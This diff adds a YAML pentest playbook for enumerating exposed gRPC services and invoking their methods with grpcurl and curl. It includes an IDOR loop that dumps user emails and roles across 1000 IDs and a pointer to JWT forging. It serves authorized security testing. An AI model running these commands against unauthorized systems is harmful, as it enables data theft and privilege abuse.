@@ -1,0 +1,108 @@
+id: grpc-enumeration
+name: "Web — gRPC enumeration + method invocation"
+description: >
+  gRPC services (HTTP/2 + protobuf) are increasingly exposed in
+  microservices architectures. If reflection is enabled — and on
+  internal services it almost always is — you can list every method
+  and call them ad hoc, often without authentication.
+tags: [web, grpc, microservices, enumeration]
+difficulty: medium
+
+inputs:
+  - name: target_host
+    description: "Host:port of the gRPC service (e.g. api.target.com:443)."
+    required: true
+
+steps:
+  - id: probe_grpc
+    name: "Confirm host speaks gRPC"
+    inline_command: |
+      grpcurl -insecure '<host>' list
+      # If TLS: -insecure if self-signed; drop -insecure for valid CA.
+      # If plaintext: add -plaintext
+      grpcurl -plaintext '<host>' list
+    inputs:
+      host: "${target_host}"
+    notes: |
+      Output: list of services (e.g. `api.UserService`, `api.AdminService`,
+      `grpc.reflection.v1alpha.ServerReflection`). Reflection MUST be
+      enabled — silent failure otherwise (returns "server doesn't support
+      reflection").
+
+  - id: enumerate_methods
+    name: "Enumerate methods per service"
+    inline_command: |
+      grpcurl -insecure '<host>' list <service>
+      # Then inspect each method's IO types:
+      grpcurl -insecure '<host>' describe <service>.<method>
+      # And the message schemas they use:
+      grpcurl -insecure '<host>' describe <package>.<MessageName>
+    inputs:
+      host: "${target_host}"
+    notes: |
+      Examples of high-value method names you almost always find:
+        GetUser, GetUserById, ListUsers, AdminGetUsers
+        ResetPassword, DeleteUser, PromoteToAdmin
+        ExecuteQuery, RunScript, RunCommand (RCE in plain sight)
+        ExportData, ExportSecrets, DumpConfig
+
+  - id: call_method
+    name: "Invoke methods directly"
+    inline_command: |
+      # Pass JSON args via stdin / -d:
+      echo '{"id": 1}' | grpcurl -insecure -d @ '<host>' <service>/<method>
+      # Or inline:
+      grpcurl -insecure -d '{"id": 1}' '<host>' <service>/GetUser
+      # With metadata (gRPC's headers — for auth tokens):
+      grpcurl -insecure -H 'authorization: Bearer <jwt>' -d '{"id":1}' '<host>' <service>/GetUser
+    inputs:
+      host: "${target_host}"
+    notes: |
+      Many gRPC services trust internal callers (no auth on internal
+      services). If you can reach the endpoint, you can usually invoke.
+
+  - id: idor_user_dump
+    name: "IDOR sweep — iterate IDs"
+    inline_command: |
+      for id in $(seq 1 1000); do
+        grpcurl -insecure -d "{\"id\": $id}" '<host>' api.UserService/GetUser \
+          | jq -c '{id, email, role}'
+      done
+    inputs:
+      host: "${target_host}"
+
+  - id: no_reflection_workaround
+    name: "Reflection disabled? Hunt for .proto files"
+    inline_command: |
+      # Common locations:
+      # - Public mobile-app source: pull APK → strings → look for .proto names.
+      # - JS frontend: grep for "google/protobuf" imports — gRPC-Web stub.
+      # - .well-known/grpc — some apps publish service definitions.
+      # Then:
+      grpcurl -insecure -proto api.proto '<host>' <service>/<method>
+    notes: |
+      grpcui is also useful — drop your .proto in and click through methods.
+
+  - id: bypass_grpc_web
+    name: "gRPC-Web variant — POST /<service>/<method> with binary body"
+    inline_command: |
+      # Some browsers can't speak HTTP/2 plain gRPC; servers add gRPC-Web
+      # proxying. That layer is reachable as plain HTTP/1.1 POST:
+      curl -X POST 'https://<host>/<service>/<method>' \
+        -H 'Content-Type: application/grpc-web-text' \
+        -H 'X-User-Agent: grpc-web-javascript/0.1' \
+        --data-binary 'AAAAAAU<base64 of protobuf payload>'
+
+references:
+  - title: "grpcurl"
+    url:   "https://github.com/fullstorydev/grpcurl"
+  - title: "HackTricks — gRPC pentesting"
+    url:   "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/grpc-web-pentest.html"
+
+next_chains:
+  - chain: graphql-introspection-injection
+    when:   'sibling API exposes both gRPC + GraphQL'
+    reason: 'Same backend often exposes both — attack the easier surface.'
+  - chain: jwt-attacks
+    when:   'gRPC auth via JWT in metadata'
+    reason: 'Captured token → forge stronger ones.'
